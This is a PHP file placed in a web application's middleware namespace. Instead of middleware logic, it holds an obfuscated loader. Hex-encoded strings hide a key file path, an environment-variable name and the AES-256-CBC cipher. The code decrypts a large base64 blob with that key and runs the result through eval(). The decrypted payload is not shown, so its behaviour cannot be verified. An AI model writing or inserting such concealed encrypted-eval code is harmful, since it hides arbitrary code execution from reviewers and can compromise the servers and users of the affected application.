<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zDX4AqhycKNbyj9DLNLXpA==');

$c=base64_decode(

'2PLiMRW0bIUq7vUPifnTW6UShjYVRbhIJ7KbCrZda36h4DqbRYLbUHln/Qyr/t93yC5WOtJLJSBs' .
'WTWam8gplNrOcBE3d17gfj+dntbj1BVFzqlUm6Q49VJtiZh5mio5JwU46PkreTFmhesCLR4PC78S' .
'c4gNypL6GPio1ju6sbIq3mKOuC+g0G6LpoqzZDSg93OoVl2exIczj1FqmWdtxrI2pivCZaGk1ieq' .
'luBzM7q/YJOWZuvZUwgnMek4q8tDjpsX/BB106QE0hEMwkORCTIbPZ6O1RQfxiptq88PuAu/pO+q' .
'OwBFiD9e8IuyRpA7qbd1hFsDFw/s6U7ulPk3u/amhYlDCh/hAJj5N4VhBSewGXkN/KCMbY3CIRHB' .
'uRfKtkmdluZZPi82OMgF6fcNnoiTzv4SST0P2GB3+tfAtOV+X3FcVdkwg9aePkSfBzmIXBp8eOTy' .
'8OL8duPwkM8vYm+3u5BrsLlO7oBWVXtrg9FstjouvNs/Z1Tx4YL99GWlul+j60ip8wK3mwaDiIKH' .
'jYOaeDoTY+oll69sMMxqHwhJmJ6QWQ6Eq5TTXs9DM2tJKZxUPSLuG/lIHFWKL47LZd8Qc09g/8IN' .
'rhBxc/ETD3udsE4J45xXITaLCc4gG2q3vAQonTtLL9s61yC0MBUbjwdr1W2fQUZoynSwiYOg14qY' .
'hQo7PnEtBbVAVLl1WiVieXNSfLlcxj8U1pj4UODuUQk+S55yQqQn+KZI/x7ygVHtSx6Cqi/IQyNy' .
'Ru2A8ybdFrBMp7rtX7SqYUgY4WSP+F7rItOsDElP4UWc/s06BQm+6LkDZ6Cb9PJW2H/BrGeiD9FA' .
'WDTL1IX5lmr0imP1s668TMTr/aKSnCRAtVY+t2EwCopFCAOByBM/SI07tLL6To5aIVlT5hxBpdDg' .
'Vx6bf+N9FpZ50Alg4uy8Oz9WWoGgXcnGSFWar5gNmZBD6p/eLdpVK8F6VCkW4U9pABPC/qsgLH7G' .
'ZeWycDVHtQgOx5Npcwq4ByS0PB+blzxAlC8yoGRDoBtXrY7LtvYVK5PTld2x/7efsSIqTqJEONtU' .
'ZK9z3TeHO47gR/onFfqYqGyxnPUDfBsBlZNkA4oBhggfkXOydFfLP8OR0jkr0PtSXj629BCZoTcw' .
'Kl4O5MGPFl5E9Fiu7hZvy/ZeRZLcO0agl+QKuT2Uap/XP+Xpp03gRmCtmz7F7n+YNTpf9uWaqQiK' .
'XlvIGjreOw0RthrXCB4+7sIonpidJKSo0530rHQ3Btto1mc63H6ShdhLJWgq9Q+Bbh0O5sPg99Iv' .
'0g+AYX5RH8D19CHAj6QBV12H2+FdOZUinmkMXhc+PL70uyFDaFyQ7EeiPQ/KtedCQlTLkJ2tcJEa' .
'1HrY7Xq+4L0UieMAe+hlKkqxo3KGPRzJBfnygYEXUAbbaVV0PWEykpcnbkhqNfNN1PCf2SHZ0AIX' .
'LeTtAVWSt7LqOcFOh5Yu4lRL5/6ridmZCFtfXRuGpjk6l7fpkoo2Oh6vCWeHI+bSbriePgCr80WH' .
'bgCnxO6YmYJ8mzWRRnVYiWQoSgYwT0oOKI3dyg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

